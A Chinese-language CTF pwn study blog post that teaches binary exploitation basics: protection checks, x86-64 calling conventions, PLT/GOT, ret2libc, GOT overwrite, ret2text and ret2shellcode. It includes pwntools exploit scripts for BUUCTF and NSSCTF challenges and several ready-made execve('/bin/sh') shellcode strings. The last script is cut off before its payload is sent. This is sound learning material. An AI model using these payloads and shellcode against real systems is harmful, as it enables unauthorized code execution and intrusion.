---
title: "CTF-pwn 学习日志 0x00 版"
description: "如有错误请指出"
date: 2025-12-17T00:00:00+08:00
image: ctf.png
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---

使用环境 ：wsl kali linux

```
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2025.3"
VERSION="2025.3"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31
```

## Reference

[hello ctf](https://hello-ctf.com/home/)

[shellcode 的艺术](https://xz.aliyun.com/news/6249)

[生成可打印的shellcode](https://xz.aliyun.com/news/5275)

[buuctf之pwn题(持续更新)](https://www.z1r0.top/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/)

[SROP 攻击原理与例题解析](https://www.anquanke.com/post/id/217081)

## 安全保护检查

设某道题附加可执行文件 ciscn 。

`chmod +x ./ciscn` 给文件 ciscn 加上 可执行权限。

`pwn checksec ciscn_2019_c_1` 查这个二进制的常见防护机制。

常见的安全保护：

* Arch: 
  * `i386-32-little`：32 位，小端，参数多在栈上传。
  * `amd64-64-little`：64 位，小端，参数通常走寄存器。
* RELRO：
  * `No RELRO`：GOT 表可写、可在运行时继续解析，更容易做 GOT 覆写。
  * `Partial RELRO`：启用了部分保护：`.got``.plt` 仍可能可写。
  * `Full RELRO`: GOT 在解析完成后会被设成只读，基本堵死 GOT 覆写路线（但不影响 ret2libc/ROP 泄露）
* Stack:
  * `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。
  * `No canary found`：没 canary，栈溢出更直接。
* NX：
  * `NX enabled`：栈/堆大多不可执行。
  * `NX disabled`：可执行栈。
* PIE：
  * `PIE enabled`：程序本体代码段地址也会随机化（每次运行基址变）。
  * `No PIE (0x400000)`：程序本体地址固定（常见起点 0x400000），libc 仍可能因 ASLR 随机。

示例（ciscn_2019_c_1）：

<img width="352" height="132" alt="image" src="https://github.com/user-attachments/assets/18e3c6e1-575c-44c8-873d-7c36256a91b6" />


##  初学 Pwn，二进制安全

我们的目的通常是得到 `system` 函数的参数，得到 `system` 我们就可以操控服务器的操作系统。

在 Pwn 题中，我们最想构造的参数永远是 `/bin/sh`。

* 如果执行 `system("ls")`：程序只是列出当前目录的文件，然后马上结束，又回到了受限状态。

* 如果执行 `system("/bin/sh")`：

  * `sh` 是 Linux 的 Shell（壳层） 程序。

  * 当运行它时，它不会自动结束，而是会跳出一个光标，等待你输入新的命令。

  * 这时候，我们获得了一个直接和系统对话的终端窗口。

这就是所谓的 Get Shell（拿设）。

在提供的代码中，往往没有访问根目录的权限，而当我们执行 `system("/bin/sh")` 后，我们就可以在根目录查看 flag。

## x86环境，初识汇编语言 1

以 `C++` 为代表的高级语言，与汇编语言有很大的区别，其中有个区别在于 **如何传递参数** 。

```cpp
#include<stdio.h>

int main(){
    printf("hello world");
    return 0;
}
```

以上述代码（设为 `main.c`）为例，这里的“参数”指的就是字符串 "hello world" 的内存地址。

在 `C` 这类高级语言中，你不需要操心这个字符串放在哪，也不需要操心 printf 怎么拿到它，编译器会帮你搞定一切。

但是从汇编语言的角度来讲，CPU 在执行 `printf` 函数时（即汇编语言中 `call printf` 指令），必须先把参数准备好，放到 **寄存器** 上，`printf` 来了直接从寄存器取。

（寄存器：一个位于 CPU 内的储存结构，里边可以储存一些变量）

### 寄存器

执行 `gcc -S main.c -o main.s -masm=intel`，我们的 C 语言源码 `main.c` 会被编译，并输出等价的 intel 语法的汇编语言源码在 `main.s` 中

```
.LC0:
    .string "hello world"
main:
    lea rdi, .LC0[rip]
    mov eax, 0
    call    printf@PLT
    mov eax, 0
    ret
```

以上是刚刚代码的汇编代码（摘选），其中：

```
.LC0:
    .string "hello world"
```

指定义数据，`.LC0` 指 `Local Constant 0（局部常量 0 号）`，是 `gcc` 编译器自己起的名字，他在编译器眼里代表了一个内存地址。

那么汇编语言中 `lea rdi, .LC0[rip]`指，把 `.LC0`（也就是 "hello world" 字符串）在内存里的地址，**复制** 到 `rdi` 寄存器里放好。

等到 `call printf`时，它会习惯性地去 `rdi` 里看一眼，就能找到这个字符串在哪里了。

最后 `mov eax, 0` 其实与 `return 0` 相对应，即汇编里的返回值，**接下来我们将分别解析这三部分** 。

* **为什么传递的是“地址”而不是“字符串本身”？**

这就是为什么使用寄存器，寄存器 `rdi` 很小，只有 64 位（8 个字节），放不下很长的字符串。所以我们不把整个“hello world”塞进寄存器，而是把它的地址告诉寄存器。`printf` 拿到地址，就能自己去内存里读出整个字符串了。

* **那么 CPU 中有多少寄存器呢？如果有很多寄存器，如何保证 `printf` 调用 `rdi` 寄存器？**

CPU 中寄存器不止一个，但是他们的分工非常明确。

在 x86 环境下，调用约定（Calling Convention）规定，函数在被调用时，**参数必须按照特定的顺序放在特定的寄存器里**。

`printf` 不会只看 `rdi`，它会根据你给它的参数数量，依次去检查不同的寄存器。

当你在 C 语言里调用一个函数（比如 `printf` 或 `add`）时，前 6 个 **整数型参数** 必须 **依次存放** 在以下寄存器中：

（这里 **整数型参数** 指指针是一个整数，任何类型的指针 `void *, int *, struct node *` 在传参规则里，通通都被视为“整数”。）
（真正不走 `rdi, rsi` 这条路的，主要是 浮点数，它们使用 `XMM` 寄存器，从 `xmm0` 到 `xmm7`）

1. `rdi`，Destination Index（目的）。
2. `rsi`，Source Index （源）。
3. `rdx`，Data（数据）。
4. `rcx`，Counter（计数）。
5. `r8`，第 8 号。
6. `r9`，第 9 号。

容易发现他们的前缀都有一个 r，这其实是 `Register` 的意思，代表了 `64` 位。

同理，e 开头，代表 `Extended` (32位)。

无前缀：代表 16位。

L/H 后缀 (DIL)：代表 `Low` (8位)。这是最小的一个字节。

以 `RDI` 和 `EDI` 为例，它们在物理上是同一个寄存器，该规则适用于所有通用寄存器。

回归正题，如果函数调用，超过 6 个参数，**第 7 个开始的参数才会被放在栈 (Stack)** 上。

举个例子：

假设你在 C 语言里写了这样一行代码，有两个参数：

```
//       参数1    参数2
printf("数字是: %d", 666);
```

汇编的世界里，这一行代码会被拆解成这样：

1. 准备参数 1：把字符串 "数字是: %d" 的地址放入 `rdi`。
2. 准备参数 2：把整数 666 放入 `rsi`。
3. 调用：`call printf`。

printf 先分析 `rdi`寄存器，`rdi = "数字是: %d"` 的地址，然后分析字符串发现 `%d`，于是 **依次** 分析 `rsi`，打印整数 `666`。

另外还有很多很重要的寄存器，我还在学习（）

* 题外话：为社么第 5 个寄存器名为 `r8`？

其实是不太有意义的问题，“8”代表的是它在 CPU 里的编号，而不是它在传递参数时的顺位。

编号为 8 的原因，是因为在 x32 时代，cpu 里只有 8 个寄存器（编号从 0 到 7），当时的工程师还给它们起比较有意义的名字：
```
0,RAX,累加器 (Accumulator)
1,RCX,计数器 (Counter)
2,RDX,数据 (Data)
3,RBX,基址 (Base)
4,RSP,栈顶 (Stack Pointer)
5,RBP,栈底 (Base Pointer)
6,RSI,源索引 (Source Index)
7,RDI,目的索引 (Destination Index)
```

到了 x86-64 时代，决定再加 8 个新的寄存器。新来的自然就从 8 号 开始排，一直排到 15 号。

```
R8, R9, R10, R11, R12, R13, R14, R15
```

### 调用函数与系统库

容易观察到 `call printf@PLT`，后面有一个 `@PLT`，指 `Procedure Linkage Table（过程链接表）`。

`printf` 并不是我写的函数，而是系统自带的库函数（位于 `libc.so` 这个大仓库里），而系统库 `libc` 的内存地址在每一次运行中位置不同。

这个深刻的机制叫 ASLR(Address Space Layout Randomization，地址空间布局随机化）。

如果没有 ASLR 机制，那么系统库的地址永远固定在一个位置，就容易被黑客写攻击脚本。

为了安全性，ASLR 把水搅浑，每一次新的运行，系统库的内存地址都会改变。

但是，系统库的位置是变化的，`printf` 等函数相对系统库的位置却是固定的，于是我们称这个相对距离叫 **偏移量**。

返回到  `call printf@PLT` 上来，既然 `printf` 的内存地址的变化的，那么我们需要知道 `printf` 具体在哪，这就需要两个工具：

* **`PLT`(过程链接表 - Procedure Linkage Table) 和 `GOT`(全局偏移表 - Global Offset Table)**

`PLT` 执行以下两种操作：

1. 若要访问的地址已经存在于 `GOT` 中：直接访问。

2. 若要访问的地址不存在于 `GOT` 中，那么使用 **“动态链接器 `ld-linux.so`”** 现查这个地址，再把它写入 `GOT` 中。

* 动态链接器Dynamic Linker `ld-linux.so`，它在程序运行前先 **随机** 找到一块内存空地，放入 `libc.so`，记录下 `libc` 的基地址。
* 在 `PLT` 调用其时，再重定位。

`PLT` 与 `GOT` 有点类似于 **接线员和通讯录** 的关系，又有点像 **搜索后的记忆化** 。

而 `GOT` 表 是一块可读写的白板，而且接线员 (`PLT`) 对通讯录 (`GOT`) 是绝对信任的，那么我们可以通过更改 `GOT` 的方法使得程序，执行不该执行的命令。

这带来了著名的 **GOT 覆写攻击** 。

而且得到了 `printf` 的地址，我们就可以通过 **确定** 的偏移量，得到很多东西确定的位置。

这带来了一个经典的攻击技巧：**Ret2Libc（Return to Libc）** 。

#### Ret2Libc

如果我想调用 `system("/bin/sh")`，但不知道 `system` 今天的真实地址在哪里（因为 ASLR），你需要做两步：

1. 泄露 (Leak)：先想办法读取内存，获知现在 `printf` 的真实地址（假设它是 Addr_A）。

2. 计算：
* 我知道 `printf` 和 `system` 在 libc 文件里的相对距离（偏移量差）。
* 比如：`system` 永远在 `printf` 后面 `0x1000` 字节处。（仅为假设）
* 计算出 `system` 的地址 = `Addr_A + 0x1000`。

现在你算出 `system` 的地址了，就可以控制程序跳转过去了。

#### GOT 覆写攻击

攻击者的操作：

1. 利用漏洞（比如任意地址写），偷偷把 `GOT` 表上记录的 `printf` 的真实地址，擦掉。
2. 在上面写上 `system` 函数的地址。
3. 等到程序下次执行 `call printf@PLT` 时...
4. PLT 调用错误的地址，执行错误命令。
5. 结果：本该打印东西，结果却执行了命令（Get Shell）。

### 汇编里的返回值

观察：

```
mov eax, 0
call    printf@PLT
mov eax, 0
ret
```

`eax` 这个寄存器十分的特殊，它是 **返回值寄存器** 。

当我们调用某个函数，必须把其 **运算结果** 或 **任务状态** 放入 `eax` 寄存器，例如：

* 如果是 `add(2, 3)`：`add` 函数算完后，会把 5 放入 `eax`，然后才返回。
* 如果是 `main` 函数：最后 return 0，就是把 0 放入 `eax`，告诉系统“我正常运行结束了”。

那么汇编中，为什么有两句 `mov eax, 0` 呢？

首先必须了解，**`mov 接收者(Dest)，发送者(Source)` 的结构**，那么

对于第二处：

```
mov eax, 0
ret
```

毫无疑问，`return 0` 为了保证函数结束时，`eax` 里的值确确实实是 0，所以在执行 ret 之前，必须强制把 0 塞进 `eax`。

对于第一处：

```
mov eax, 0
call    printf@PLT
```

因为 `printf` 是一个变参函数（参数个数不确定）。

系统规定：在调用变参函数时，必须用 eax (具体说是 al) 告诉函数，有几个参数是浮点数（放在向量寄存器里的）。

拿这个程序举例子：

1. 我们调用 `printf("hello world")`。
2. 这句话里没有浮点数（小数）。
3. 所以，我们必须把 `eax` 设置为 0。
4. 如果我们不把 `eax` 清零，而 `eax` 里正好残留了一个垃圾数据（比如 5），printf 就会误以为有 5 个浮点数，跑去读取浮点寄存器，这有可能会导致程序崩溃。

## x86环境，初识汇编语言 2

```
#include<stdio.h>

int add(int a, int b){
    return a + b;
} 

int main(){
    printf("%d", add(2, 3));
    return 0;
}
```

对上面的程序进行汇编：

```
add:
        push    rbp
    mov rbp, rsp
    mov DWORD PTR -4[rbp], edi
    mov DWORD PTR -8[rbp], esi
    mov edx, DWORD PTR -4[rbp]
    mov eax, DWORD PTR -8[rbp]
    add eax, edx
    pop rbp
    ret
main:
    push    rbp
    mov rbp, rsp
    mov esi, 3
    mov edi, 2
    call    add
    mov esi, eax
    lea rdi, .LC0[rip]
    mov eax, 0
    call    printf@PLT
    mov eax, 0
    pop rbp
    ret
```

我们主要看函数调用部分：

```
add:
        push    rbp
    mov rbp, rsp
    mov DWORD PTR -4[rbp], edi
    mov DWORD PTR -8[rbp], esi
    mov edx, DWORD PTR -4[rbp]
    mov eax, DWORD PTR -8[rbp]
    add eax, edx
    pop rbp
    ret
```

### 存储逻辑，栈

对于每一个函数调用过程，都会有一个属于其的栈空间。

对于每一个程序，其启动的时候，内核会为其分配一段 **内存，称为栈**，遵循先进后出。
（内存里**只有一个大栈**，所有函数共用，但是 `rbp` 等 **寄存器只有一个**）

**首先**，在 `main` 函数调用 `call    add` 时，CPU **自动把 “返回地址” 压入栈**。

接下来进入 `add` 函数：

```
RSP,栈顶 (Stack Pointer)
RBP,栈底 (Base Pointer)
```

`push rbp`：保存上一级函数（此例中为 `main`）的基址指针。

在新的栈上进行操作，不能把上一级函数的调用位置忘了，所以先把他压到栈 **保存起来**，接下来我们好对 `rbq` 这个寄存器修改，类似于 `swap(a,b)` 中的 `temp` 变量。

`mov rbp, rsp`：把当前的栈顶变成为新的栈底。

现在，由于 `rbp` 指向的位置已经被**保存在栈了**，所以我们将现在的 `rbp` 寄存器作为新的栈底，建该层函数新的内容，那这层函数刚刚开始，栈顶 `rsp` 就是这侧函数的 `rbp`。

**（`rsp` 寄存器储存的总是当前栈顶的位置。）**

往下看直到 `pop rbq` 的意义其实不大，可以跳过：

`edi` 是刚刚学的，一个 32位寄存器，对应了代码中的 `int a`。

`DWORD PTR`，Double Word Pointer，意思是“操作 4 个字节”（因为 `int` 是 4 字节），**它的针对对象是 `-4[rbp]` **。

（`QWORD PTR` 代表 8 字节或 **指针**，`WORD PTR` 代表 2 字节，`BYTE PTR`代表 1 字节)

`-4[rbp]`：意思是在栈底往上挪 4 个字节的位置。

那么这段代码含义就是：把参数 a 从寄存器里拿出来，备份到栈内存里。

那么我们第一个汇编代码为什么没有 `DWORD PTR`？

因为这个指的是 **在内存里操作 4 字节**，也就是只有真正对内存操作时，才需要引用，而 **栈属于内存**。

如果对第一个代码更改如下：

```
int main() {
    int secret = 1234;  // 定义了一个局部变量
    printf("hello world");
    return 0;
}
```

就会生成以下的汇编：

```
mov DWORD PTR -4[rbp], 1234  ; 
```

那么现在又有一个问题，我在汇编 1 中写道：

> 如果函数调用，超过 6 个参数，**第 7 个开始的参数才会被放在栈 (Stack)** 上。

那么为什么这段汇编代码上来就把两个参数传到了栈里？

因为这是 **函数的临时变量是储存于栈上的**，它是储存问题，不是传参问题。

看 **汇编 2** 的汇编代码：

```
    mov esi, 3
    mov edi, 2
    call    add
```

它的传参依然是传的寄存器，没有动栈。

**最后**，

函数做完了，执行

```
pop rbp
ret
```

* `pop rbp`:
  * 把栈顶的值弹出， 还给 `rbp` 寄存器，这样我们返回上一级函数时，栈帧是正常的。
* `ret`
  * 还记得 `call    add`自动把返回地址入栈吗，当 `rbp` 已经弹出，这个返回地址就露出了。
  * `ret` 会从栈顶弹出一个地址（返回地址），并跳过去执行。

### 栈溢出 Ret2text

栈溢出的本质，其实是一场**“方向的碰撞”**。

我们得知：

* 栈的生长方向：从高地址 -> 低地址。
  * `push` 会让 `RSP` 减小，新开辟的局部变量（buffer）在低地址。
* 数据的写入方向：从低地址 -> 高地址。
  * 不管是在 C 语言里写数组 `buffer[0], buffer[1]...`，还是用 `read、gets、strcpy` 函数，写入数据时永远是往高地址增长的。

结果： 如果你往 buffer 里写的数据太多，它就会向高地址增长，冲掉栈的内容。

假设 `vulnerable_function` 里有一个 `char buffer[16]`，并且有一个 `read(0, buffer, 100)` 的漏洞（最大读入 100 个字符），或者 `gets(buffer)` 的漏洞（不检查输入长度）。

| 内存地址 (高 -> 低) | 内存里存的东西 | 它是谁？ |
| :--- | :--- | :--- |
| **0x1010** | `0x00401234` | **返回地址 (Ret Addr)** <br> *(指向 Main 的下一行)* |
| **0x1008** | `0x00001000` | **旧 rbp** <br> *(main 的栈底)* |
| **0x1000** | (空) `buffer[8-15]` | 局部变量的高位 |
| **0x0FF8** | (空) `buffer[0-7]` | **局部变量的起始位置** <br> *(read 从这里开始写)* |

(注：这里 buffer 是 16 字节，所以占了两个格子)

现在，我们利用漏洞，强行输入 24 个 'A'，再加上 8 个 'B'。

1. 填满 Buffer (16字节) 输入的前 16 个 'A'，老老实实地填满了 `0x0FFF` 到 `0x1007` 的空间。此时一切正常。
2. 淹没 rbp (8字节) 我们没有停手，继续输入：接下来的 8 个 'A' 没地方去了，只能顺着地址往高处写，它们无情地覆盖了 0x1008 处的 旧 rbp。
* 程序虽然还没崩，但当它想恢复 main 函数的栈底时，会拿到一堆 'A' (0x41414141...)，导致 main 函数的栈废了。
3. 劫持 Ret，我们还在输入：最后的 8 个 'B' 继续往高处写，覆盖了 `0x1010` 处的 返回地址。
* 原本这里写着“回 Main 函数的路”，现在被改成了 'BBBBBBBB' (0x42424242...)。

当 `vulnerable_function` 运行结束，执行到 `ret` 指令时，程序跳转到了一个非法地址，崩溃了（Segmentation Fault）。

那么，我们如果把最后 8 个 `B`，换成 **后门函数（backdoor）** 的真实地址，CPU 就会跳进去帮我们找到 Shell。

#### pwndbg 调试找到 offset

用 pwndbg 找到「覆盖到返回地址 RIP/EIP 需要的字节数（offset）」

自己算也可以。

1. 启动 pwndbg

<img width="679" height="127" alt="image" src="https://github.com/user-attachments/assets/4efc4b9e-4efa-4ee2-939b-49861699ba45" />

2. 查看 main 函数汇编

<img width="529" height="298" alt="image" src="https://github.com/user-attachments/assets/fc7180fc-3b56-4eb1-81e5-581efdfd46ed" />

3. 在 gets 调用处下断点

<img width="173" height="32" alt="image" src="https://github.com/user-attachments/assets/b59f7fe3-847c-4238-8fbf-84ba6698919e" />

4. 运行到断点

<img width="675" height="657" alt="image" src="https://github.com/user-attachments/assets/c520d302-ac1c-4501-a4ff-2d2555e22731" />

5. 生成随机 cyclic 字符串

<img width="1258" height="50" alt="image" src="https://github.com/user-attachments/assets/7f73a3c0-feed-463c-b33f-be35f6dc5d10" />

6. 继续运行程序。

以该题目为例，它会执行 `call gets@plt`，然后卡在 `gets` 里等待你输入。

<img width="1259" height="628" alt="image" src="https://github.com/user-attachments/assets/1150295f-0a2a-4ce1-b889-bf2e9b3966b2" />

其中有一段标为绿色的代码行：

```
► 0x401185 <main+67>    ret                                <0x6161616161616461>
```

箭头 ► 指向指当前要执行的命令是 `ret`，`0x401185 <main+67>` 是 `ret` 的位置，尖括号是 `ret` 将要跳去的地址：`<0x6161616161616461>`。

7. 看当前指令指针指向哪。

<img width="379" height="32" alt="image" src="https://github.com/user-attachments/assets/fcbc93e0-b4cb-49fb-8ad0-2950a2f9002b" />

`0x401185 <main+67>` 即 `ret` 的位置。

8. 查看栈顶的 8 字节内容

<img width="244" height="32" alt="image" src="https://github.com/user-attachments/assets/eb77856d-e56b-44df-9dde-ea91cd0b5877" />

这条命令的含义：“从 $rsp 指向的内存地址开始，读取 8 字节，并用十六进制打印出来。”

9. 反查这 8 字节模式在 cyclic 里的位置，输出就是 offset。 

<img width="507" height="72" alt="image" src="https://github.com/user-attachments/assets/7376ffdc-142f-4367-8e48-44d2284c71b9" />

#### 例题 1：rip

[BUUCTF 题目链接](https://buuoj.cn/challenges#rip)

安全防护检查：

<img width="381" height="169" alt="image" src="https://github.com/user-attachments/assets/c449ecd2-e712-4c1b-ae13-68d0ac36dd79" />

`PIE:        No PIE (0x400000)` 主函数基地址不变，可以直接查函数的地址。

使用 IDA 反编译结果如下：

<img width="1280" height="362" alt="image" src="https://github.com/user-attachments/assets/957b60b5-0338-4b10-af8d-b61cff06d64b" />

容易发现有一个 `fun()` 函数，藏了 `return system("/bin/sh");`。

Exports 中查到 `fun()` 函数的地址：

<img width="1278" height="379" alt="image" src="https://github.com/user-attachments/assets/6cf82a27-b178-46f0-bc65-8383358cb47e" />

是 `fun	0000000000401186	`。

接下来找到 offset，构造 payload，本人使用 gdb 调试得到 offset=23。

然后写代码：

```
# written by Sonnety
from pwn import *

context(os="linux", arch="amd64")
context.log_level = "debug"

host = "node5.buuoj.cn"
port = 25390

offset = 23
fun_addr = 0x401186  # 从 IDA / disas 看到的 fun() 地址
ret_addr = 0x401016

def main():
    io = remote(host, port)

    # 先输出提示再读入
    try:
        io.recvuntil(b"please input", timeout=2)
    except Exception:
        pass
    payload = b"A"*offset + p64(ret_addr) + p64(fun_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：warmup_csaw_2016 1

[BUU CTF 题目链接](https://buuoj.cn/challenges#warmup_csaw_2016)

运行可执行文件，得到一些神秘的东西：

```
┌──(Sonnety㉿LAPTOP-R4AP2N3H)-[/mnt/d/CTF_samples/warmup-csaw-2016]
└─$ ./warmup_csaw_2016
-Warm Up-
WOW:0x40060d
```

IDA 反编译一下，发现这是后门函数地址。

<img width="1024" height="181" alt="image" src="https://github.com/user-attachments/assets/b0e020a7-07c6-446b-b01f-bf10b0d0645d" />

<img width="1278" height="392" alt="image" src="https://github.com/user-attachments/assets/37810f8f-5c9a-484f-9145-6e275e253fa3" />

而且还有 gets，只剩下算偏移了。

这个题做了去符号，`disas main`找不到地址，所以执行 `starti`，在 `gets` 上打断点。

<img width="558" height="715" alt="image" src="https://github.com/user-attachments/assets/86f56263-8820-4842-aa12-8a858eeb8375" />

<img width="1157" height="676" alt="image" src="https://github.com/user-attachments/assets/8fd17e8e-7d7a-4a14-8c6f-eca6a08fa595" />

<img width="982" height="238" alt="image" src="https://github.com/user-attachments/assets/0d5108f1-80d4-4928-a0ae-cba227da7c71" />

```
# written by Sonnety
from pwn import *

host = "node5.buuoj.cn"
port = 28105

offset = 72
backdoor = 0x40060d

def main():
	io = remote(host,port)
	
	try:
		io.recvuntil(b"WOW:0x40060d",timeout=2)
	except Exception:
		pass
	payload=b"A"*offset+p64(backdoor)
	io.sendline(payload)
	io.interactive()
if __name__ == "__main__":
	main()

```

#### 例题 3：jarvisoj_level0_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level0)

和上两道题没什么太大区别。

可能多了一个 `rop --grep "ret"` 得到 ret 地址。

不再详细写解题步骤。

```
# written by Sonnety
from pwn import *

host = "node5.buuoj.cn"
port = 28777

offset = 136
backdoor = 0x400596
ret_addr = 0x400431

def main():
	io=remote(host,port)
	try:
		io.recvuntil(b"Hello World",timeout=2)
	except Exception:
		pass
	payload=b"A"*offset+p64(ret_addr)+p64(backdoor)
	io.sendline(payload)
	io.interactive()
if __name__ == "__main__":
	main()

```

### shellcode && Ret2shellcode

shellcode 是一段“机器码字节序列”（比如 x86-64 指令），它自己就能完成系统调用：`execve("/bin/sh",0,0)`，从而起 shell。

简单说，`shellcode = asm(shellcraft.sh())` 的含义就是，生成一段打开 `/bin/sh` 的机器码。

比如：

```
shellcode = ``` 
mov rbx, 0x68732f6e69622f
push rbx
push rsp
pop rdi
xor esi, esi
xor edx, edx
push 0x3b
pop rax
syscall```

```

1. `mov rbx, 0x68732f6e69622f`：把字符串 `/bin/sh`（按小端序倒着）塞进寄存器 `rbx`。
2. `push rbx`：把这 8 字节压栈。
3. `push rsp; pop rdi`：让 `rdi` 指向栈顶，也就是指向 `/bin/sh` 那块内存。
4. `xor esi, esi`，`rsi = 0`：argv 设为 NULL。
5. `xor edx, edx`，`rdx = 0`：envp 设为 NULL。
6. `push 0x3b; pop rax`，`rax = 0x3b`：execve syscall 号
7. `syscall`：发起系统调用：execve("/bin/sh", 0, 0)

也可以用现成生成器直接给一段通用 shellcode : `shellcode = asm(shellcraft.sh())`

先判断“这题能不能 ret2shellcode”，通常安全保护如下：

* NX unknown/disabled、
* No Canary Found

和 Ret2text 差别不大，依然是 dbg 得到 offset，我们使用 `shellcode.ljust(offset, b"\x90")` 将 shellcode 填充到长度为 offset，`\x90` 是 x86 的 NOP 指令（什么都不做）.

那么这一段的含义就是，让 payload 的前 offset 字节 = `“shellcode + 一堆 NOP”`，刚好填到返回地址的位置。

读取 payload 的那个 buf 地址，填入后面返回地址，就会执行 shellcode。

`payload = shellcode.ljust(offset, b"\x00") + p32(buf_addr)`。

有几个酌情使用的通用 shellcode：

* 不可见版本
  * 32 位 短字节 shellcode 21 字节

```
#\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
  * 64 位 较短的 shellcode 23 字节

```
#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05```
```

* 可见版本
  * x64 下的：

```
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t 
```

  * x32 下的：

```
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA 
```

#### 例题 1：wdb_2018_3rd_soEasy

[BUU CTF 题目链接](https://buuoj.cn/challenges#wdb_2018_3rd_soEasy)

安全防护如下，注意 **arch: i386-32-little！**

<img width="467" height="177" alt="image" src="https://github.com/user-attachments/assets/dc2ea93c-282d-4cbe-a8bf-42de21b80086" />

在 cyclic 获取 offset 时：

<img width="1217" height="363" alt="image" src="https://github.com/user-attachments/assets/c79d005d-ed62-4f83-9e99-de6366c12330" />

注意：Invalid address 0x61616174，**代表 CPU 的执行流已经跳到一个无效地址（也就是 ret 已经生效，EIP 指向垃圾地址）。**

<img width="305" height="66" alt="image" src="https://github.com/user-attachments/assets/75245759-08c6-413a-9e9d-6b81154f01f7" />

所以我们不应该像之前的题目一样执行 `x/wx $esp`，而应该执行 `x/wx $eip`。

```
# written by Sonnety
from pwn import *

context.arch="i386"
host = "node5.buuoj.cn"
port = 27629
offset = 76

def main():
    io = remote(host,port)
    io.recvuntil(b"Hei,give you a gift->")
    buf_addr = int(io.recvline().strip(),16)
    shellcode = asm(shellcraft.sh())
    payload=shellcode.ljust(offset,b"\x90")+p32(buf_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：ciscn_2019_n_5

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_n_5)

这道题虽然网络上很多题解都是 ret2shellcode 做的，但是至少在 BUUOJ 上，我试了三个 ret2shellcode 的题解都死了。

正解是 ret2libc，但是在这里只说 ret2shellcode 的错解（误）

安全检查：

<img width="445" height="197" alt="image" src="https://github.com/user-attachments/assets/7c5749e3-9391-41ec-8225-50772ca0ddd7" />

这道题反编译如下：

<img width="1018" height="338" alt="image" src="https://github.com/user-attachments/assets/ef3e1051-a2e1-4453-9fa7-8d5c037b9467" />

很容易想到 ret2shellcode，先把 shellcode 填入 name，然后利用 gets 栈溢出，使 name 的地址覆盖 ret。

（当然也可以让 shellcode 填入 text，但是 text 在栈上，地址会因为 ASLR 随机化）

<img width="1014" height="317" alt="image" src="https://github.com/user-attachments/assets/f5315268-2fc2-4269-9d2b-37e4a16cbf53" />

```
# written by Sonnety
from pwn import *

context.arch="amd64"
host = "node5.buuoj.cn"
port = 25334
name_addr=0x601080
shellcode=asm(shellcraft.sh())
offset = 0x20+8

def main():
    io=remote(host,port)
    io.recvline()
    io.sendline(shellcode)
    io.recvline()
    io.recvline()
    payload=b"A"*offset+p64(name_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

但是上面的代码会炸，为什么不能 ret2shellcode 呢？

<img width="1208" height="497" alt="image" src="https://github.com/user-attachments/assets/71c291c8-56d8-46ae-b008-bcdd33f67a4a" />

执行 `readelf -W -l ciscn_2019_n_5`，发现 name 的地址 `0x601080` 落在 `0x0000000000600e28` 和 `0x0000000000600e28+0x0001d0` 之间，其权限是 RW ，没有 E，指该段不能执行。

同理，`GNU_STACK` 的权限是 RWE，代表从栈上 ret2shellcode 从权限意义上是可行的。

但是栈的地址是 ASLR 随机化的，所以找栈的位置为什么不直接 ret2libc 呢。

不过大概可以在本地关掉 ASLR 实验一下。

[类似题目 NSS CTF：Shellcode](https://www.nssctf.cn/problem/3659)

这道题目安全防护：

<img width="404" height="148" alt="8c7f739439dba13129afbf773b601895" src="https://github.com/user-attachments/assets/597cc5b7-ea99-4d4e-a20c-53d31e2fee5c" />

虽然是 NX enabled，但是查一下：

<img width="996" height="412" alt="image" src="https://github.com/user-attachments/assets/46f8685d-995d-4138-aa59-6004ae6e8912" />

<img width="1274" height="349" alt="image" src="https://github.com/user-attachments/assets/2e68c4c7-8e7e-463e-a2ed-6e6d3b198425" />

<img width="1280" height="346" alt="image" src="https://github.com/user-attachments/assets/25112a64-e7a7-4c19-855f-d90607b6de0c" />

发现确实是不可执行栈，`&name` 也在不可执行段，但是有 `mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7);`，相当于开了可执行。

另外注意，`read(0, &name, 0x25u);` 意味着发的 shellcode 要在 37 字节内，但是 shellcraft 生成的，输出一下长度就发现是 48，超了，所以自己写一个shellcode。

```
# written by Sonnety
from pwn import *
context.arch = "amd64"
host = "node4.anna.nssctf.cn"
port = 26418
offset = 18
name_adr = 0x6010A0	

shellcode='''
mov rbx, 0x68732f6e69622f  
push rbx
push rsp 
pop rdi
xor esi, esi               
xor edx, edx            
push 0x3b
pop rax
syscall
'''

def main():
    io = remote(host,port)
    io.recvuntil(b"Please.\n")
    io.sendline(asm(shellcode))
    io.recvuntil(b"Nice to meet you.\n")
    io.recvuntil(b"Let's start!\n")
